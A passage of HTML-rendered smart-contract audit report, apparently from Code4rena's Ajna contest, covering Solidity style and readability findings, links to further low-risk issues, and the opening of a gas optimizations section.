</span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">screeningStageEndBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getScreeningStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the funding stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">screeningStageEndBlock</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that the proposal being voted on is in the top ten screened proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_findProposalIndex</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_topTenProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentDistributionId</span><span class=\"mtk1\">]) == -</span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L596\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L572-L596</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">screeningVote</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ScreeningVoteParams</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voteParams_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">QuarterlyDistribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_distributions</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_currentDistributionId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check screening stage is active</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">startBlock</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getScreeningStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"10-underscores-can-be-added-for-numbers\" style=\"position:relative;\"><a href=\"#10-underscores-can-be-added-for-numbers\" aria-label=\"10 underscores can be added for numbers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] UNDERSCORES CAN BE ADDED FOR NUMBERS</h2>\n<p>It is a common practice to separate each 3 digits in a number by an underscore to improve code readability. Unlike <code>MAX_EFM_PROPOSAL_LENGTH</code> below, the following <code>CHALLENGE_PERIOD_LENGTH</code>, <code>DISTRIBUTION_PERIOD_LENGTH</code>, and <code>FUNDING_PERIOD_LENGTH</code> do not use underscores; please consider adding underscores for these numbers.</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L34\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L34</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CHALLENGE_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50400</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L40\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L40</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DISTRIBUTION_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">648000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L46\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L46</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FUNDING_PERIOD_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">72000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L23\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L23</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_EFM_PROPOSAL_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">216_000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// number of blocks in one month</span></span></span></code></pre>\n<h2 id=\"11-uint256-can-be-used-instead-of-uint\" style=\"position:relative;\"><a href=\"#11-uint256-can-be-used-instead-of-uint\" aria-label=\"11 uint256 can be used instead of uint permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] <code>uint256</code> CAN BE USED INSTEAD OF <code>uint</code></h2>\n<p>Both <code>uint</code> and <code>uint256</code> are used in the protocol’s code. In favor of explicitness, please consider using <code>uint256</code> instead of <code>uint</code> in the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">src</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">base</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">208</span><span class=\"mtk1\">: </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numFundedProposals</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">324</span><span class=\"mtk1\">: </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">434</span><span class=\"mtk1\">: </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate_</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">468</span><span class=\"mtk1\">: </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposals</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">469</span><span class=\"mtk1\">: </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposals</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">491</span><span class=\"mtk1\">: </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposalIdSubset_</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;) {</span></span></span></code></pre>\n<h2 id=\"12-spaces-can-be-added-for-better-readability\" style=\"position:relative;\"><a href=\"#12-spaces-can-be-added-for-better-readability\" aria-label=\"12 spaces can be added for better readability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] SPACES CAN BE ADDED FOR BETTER READABILITY</h2>\n<p>For better readability, spaces can be added in code where appropriate.</p>\n<p>A space can be added between <code>challenge</code> and <code>phase</code> in the following comment.<br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L30\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L30</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     * @</span><span class=\"mtk12\">notice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Length</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">challengephase</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distribution</span><span class=\"mtk1\"> </span><span class=\"mtk12\">period</span><span class=\"mtk1\"> </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blocks</span><span class=\"mtk1\">.</span></span></span></code></pre>\n<p>A space can be added between <code>returns</code> and <code>(uint256</code> in the following code.<br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L238\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L238</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardClaimed_</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>A space can be added between <code>currentSlateHash</code> and <code>!=</code> in the following code.<br>\n<a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L318\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L318</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"116\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">currentSlateHash</span><span class=\"mtk1\">!= </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">sum</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_sumProposalFundingVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_fundedProposalSlates</span><span class=\"mtk1\">[</span><span class=\"mtk12\">currentSlateHash</span><span class=\"mtk1\">]));</span></span></span></code></pre>\n<h2 id=\"additional-low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#additional-low-risk-and-non-critical-issues\" aria-label=\"additional low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Additional Low Risk and Non-Critical Issues</h2>\n<p>The following individual submissions from <strong>rbserver</strong> also detail low risk and non-critical issues. The judge considered these alongside rbserver’s report above in determining the top score. For full details and discussions, please view the original submissions linked below.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/297\"><code>StandardFunding</code> contract’s functionalities for proposals with positive <code>tokensRequested</code> can be DOS’ed for <code>_distributions[1]</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/296\">Users are able to call <code>StandardFunding.claimDelegateReward</code> function to claim delegate rewards when <code>block.number</code> is end block of challenge period in which challenge period is not ended though they should not be allowed to do so</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/295\"><code>StandardFunding._getDelegateReward</code> function does not factor in votes used by user during screening stage for calculating user’s delegate reward</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/293\">User can receive 0 delegate reward though she or he should receive a positive amount of such reward</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/291\"><code>Funding._getVotesAtSnapshotBlocks</code> function does not take into account user’s available votes between snapshot blocks</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/290\">Calling <code>StandardFunding.startNewDistributionPeriod</code> function can cause <code>fundsAvailable</code> for new distribution period to be less than it should be</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/286\">User can call <code>StandardFunding.updateSlate</code> function to frontrun other user’s <code>StandardFunding.updateSlate</code> transaction</a></li>\n</ul>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 32 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/284\">report highlighted below</a> by <strong>JCN</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/501\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/491\">pontifex</a>, <em>SS](<a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/482\">https://github.com/code-423n4/2023-05-ajna-findings/issues/482</a>), <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/471\">Walter</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/469\">petrichor</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/460\">Rageur</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/455\">Kenshin</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/453\">0x73696d616f</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/442\">yongskiws</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/421\">SAQ</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/395\">Shubham</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/392\">Tomio</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/391\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/370\">j4ld1na</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/364\">Aymen0909</a>, <a 